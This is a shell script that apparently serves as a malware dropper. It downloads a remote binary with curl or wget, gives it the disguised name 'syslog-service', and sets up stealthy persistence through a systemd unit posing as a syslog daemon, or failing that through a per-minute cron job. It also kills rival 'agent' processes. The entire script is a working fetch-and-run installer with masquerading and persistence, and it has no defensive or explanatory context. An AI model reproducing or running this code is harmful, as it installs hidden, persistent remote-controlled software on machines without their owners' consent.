#!/bin/sh

VPS_DOWNLOAD_URL="https://raw.githubusercontent.com/jokodoe0192-lang/tako/refs/heads/main/agent"
PROCESS_NAME="syslog-service"
LOCK_FILE="/tmp/agent.lock"

INSTALL_DIR=""
if [ "$(id -u)" -eq 0 ] && [ -w "/usr/local/bin" ]; then
    INSTALL_DIR="/usr/local/bin"
    PERSISTENCE_TYPE="systemd"
else
    PERSISTENCE_TYPE="cron"
    for dir in "$HOME" "." "/tmp" "/var/tmp" "/dev/shm"; do
        if [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ]; then
            INSTALL_DIR="$dir"
            break
        fi
    done
fi

if [ -z "$INSTALL_DIR" ]; then
    INSTALL_DIR="."
fi

TARGET_PATH="$INSTALL_DIR/$PROCESS_NAME"

DOWNLOAD_SUCCESS=0
TEMP_AGENT="/tmp/new_agent_$$"

if command -v curl >/dev/null 2>&1; then
    curl -sSL -m 30 "$VPS_DOWNLOAD_URL" -o "$TEMP_AGENT" && DOWNLOAD_SUCCESS=1
elif command -v wget >/dev/null 2>&1; then
    wget -q --timeout=30 -O "$TEMP_AGENT" "$VPS_DOWNLOAD_URL" && DOWNLOAD_SUCCESS=1
fi

if [ $DOWNLOAD_SUCCESS -ne 1 ]; then
    TEMP_AGENT="$INSTALL_DIR/new_agent_$$"
    if command -v curl >/dev/null 2>&1; then
        curl -sSL -m 30 "$VPS_DOWNLOAD_URL" -o "$TEMP_AGENT" && DOWNLOAD_SUCCESS=1
    elif command -v wget >/dev/null 2>&1; then
        wget -q --timeout=30 -O "$TEMP_AGENT" "$VPS_DOWNLOAD_URL" && DOWNLOAD_SUCCESS=1
    fi
fi

if [ $DOWNLOAD_SUCCESS -ne 1 ] || [ ! -f "$TEMP_AGENT" ]; then
    exit 1
fi

FILE_SIZE=$(wc -c <"$TEMP_AGENT")
FILE_SIZE=$(echo $FILE_SIZE)
if [ -z "$FILE_SIZE" ] || [ "$FILE_SIZE" -lt 1000000 ]; then
    rm -f "$TEMP_AGENT"
    exit 1
fi

chmod +x "$TEMP_AGENT"
mv -f "$TEMP_AGENT" "$TARGET_PATH"

if [ "$PERSISTENCE_TYPE" = "systemd" ]; then
    systemctl stop "$PROCESS_NAME" 2>/dev/null || true
    systemctl disable "$PROCESS_NAME" 2>/dev/null || true
fi

killall "$PROCESS_NAME" 2>/dev/null || pkill -f "$PROCESS_NAME" 2>/dev/null || true
killall agent 2>/dev/null || pkill agent 2>/dev/null || true
rm -f "$LOCK_FILE"

if [ "$PERSISTENCE_TYPE" = "systemd" ]; then
    SERVICE_FILE="/etc/systemd/system/$PROCESS_NAME.service"
    
    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Syslog Service Daemon
After=network.target

[Service]
Type=simple
ExecStart=$TARGET_PATH
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$PROCESS_NAME" 2>/dev/null
    systemctl start "$PROCESS_NAME" 2>/dev/null
else
    CRON_LINE="* * * * * (pgrep -f '$PROCESS_NAME' || ps -ef | grep -v grep | grep '$PROCESS_NAME') >/dev/null 2>&1 || sh -c 'sleep 2; exec $TARGET_PATH' >/dev/null 2>&1 &"
    if crontab -l >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "$PROCESS_NAME"; echo "$CRON_LINE") | crontab -
    fi
    
    sh -c "sleep 2; exec $TARGET_PATH" >/dev/null 2>&1 &
fi
